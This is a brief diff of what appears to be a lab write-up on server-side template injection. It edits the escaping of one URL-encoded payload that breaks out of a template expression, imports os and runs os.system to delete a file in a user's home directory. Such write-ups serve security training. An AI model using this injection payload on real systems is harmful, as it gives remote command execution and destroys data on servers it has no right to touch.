@@ -31,6 +31,6 @@ payload:
 paylod:
 
 ```javascript
-=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/Carlos/morale.txt')
+=user.name}}{`%`25+import+os+%25}{`{`os.system('rm%20/home/Carlos/morale.txt')
 ```
 
